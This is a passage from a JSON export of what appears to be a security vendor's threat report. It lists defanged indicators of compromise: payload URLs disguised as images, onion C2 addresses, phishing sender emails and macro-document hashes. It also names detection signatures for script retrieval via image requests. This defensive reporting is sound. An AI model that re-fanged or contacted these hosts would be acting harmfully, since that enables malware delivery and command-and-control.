                    "html": "<table class=\"MsoTableGrid\"><tbody><tr><td valign=\"top\">\n<p>Indicator </p>\n</td>\n<td valign=\"top\">\n<p>Description</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>https://www[.]fhccu[.]com/images/ship3[.]jpg</p>\n</td>\n<td valign=\"top\">\n<p>Encoded Payload URL</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>https://www[.]fhccu[.]com/images/7[.]jpg</p>\n</td>\n<td valign=\"top\">\n<p>Encoded Payload URL</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid\n\t\t\t[.]onion[.]pet/index[.]html</p>\n</td>\n<td valign=\"top\">\n<p>C2</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd\n\t\t\t[.]onion[.]pet/index[.]html</p>\n</td>\n<td valign=\"top\">\n<p>C2</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>http://shorturl[.]at/qzES8</p>\n</td>\n<td valign=\"top\">\n<p>ShortURL</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>jeanne.vrakele@gmail[.]com</p>\n</td>\n<td valign=\"top\">\n<p>Sender Email</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>jean.dupontel@protonmail[.]com</p>\n</td>\n<td valign=\"top\">\n<p>Sender Email</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>no-reply@dgfip-nanterre[.]com</p>\n</td>\n<td valign=\"top\">\n<p>Sender Email</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>f988e252551fe83b5fc3749e1d844c31fad60be0c25e546c80dbb9923e03eaf2</p>\n</td>\n<td valign=\"top\">\n<p>Docm SHA256</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>ec8c8c44eae3360be03e88a4bc7bb03f3de8d0a298bff7250941776fcea9faab</p>\n</td>\n<td valign=\"top\">\n<p>Docm SHA256</p>\n</td>\n</tr><tr><td valign=\"top\">\n<p>8912f7255b8f091e90083e584709cf0c69a9b55e09587f5927c9ac39447d6a19</p>\n</td>\n<td valign=\"top\">\n<p>Docm SHA256</p>\n</td>\n</tr></tbody></table>"
                },
                {
                    "id": "<sentence_0xff79539a>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                },
                {
                    "id": "<sentence_0xf65b2b5f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Proofpoint detects and blocks all documents associated with the campaigns and has published the following Emerging Threat signatures:",
                    "html": "<p>Proofpoint detects and blocks all documents associated with the campaigns and has published the following Emerging Threat signatures:</p>"
                },
                {
                    "id": "<sentence_0x9072a8e6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "2035303 - ET INFO Observed Chocolatey Windows Package Management Domain (chocolatey .org in TLS SNI)",
                    "html": "<p>2035303 - ET INFO Observed Chocolatey Windows Package Management Domain (chocolatey .org in TLS SNI)</p>"
                },
                {
                    "id": "<sentence_0xb260f6b6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "2035306 - ET INFO Chocolatey Windows Package Management Installation File Retrieval",
                    "html": "<p>2035306 - ET INFO Chocolatey Windows Package Management Installation File Retrieval</p>"
                },
                {
                    "id": "<sentence_0x1eaa9daf>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "2851286 - ETPRO MALWARE Malicious Script Retrieved via Image Request",
                    "html": "<p>2851286 - ETPRO MALWARE Malicious Script Retrieved via Image Request</p>"
                },
                {
                    "id": "<sentence_0xa93c8a7f>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                },
                {
                    "id": "<sentence_0x95ac1a25>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xff0db250>": "https://www.proofpoint.com/us/threat-insight/post/seems-phishy-back-school-lures-target-university-students-and-staff"
                    },
                    "text": "Previous Blog Post",
                    "html": "<a href=\"/us/threat-insight/post/seems-phishy-back-school-lures-target-university-students-and-staff\" hreflang=\"en\">Previous Blog Post</a>"
                },
                {
                    "id": "<sentence_0x8e1bde84>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xc888c199>": "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505"
                    },
                    "text": "Next Blog Post",
                    "html": "<a href=\"/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505\" hreflang=\"en\">Next Blog Post</a>"
                },
                {
                    "id": "<sentence_0x1533c5d5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Subscribe to the Proofpoint Blog",
                    "html": "<p>Subscribe to the Proofpoint Blog</p>"
                },
                {
                    "id": "<sentence_0xcae5023f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight",
                    "html": "\n*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight\n"
                }
            ]
        }
    ]
}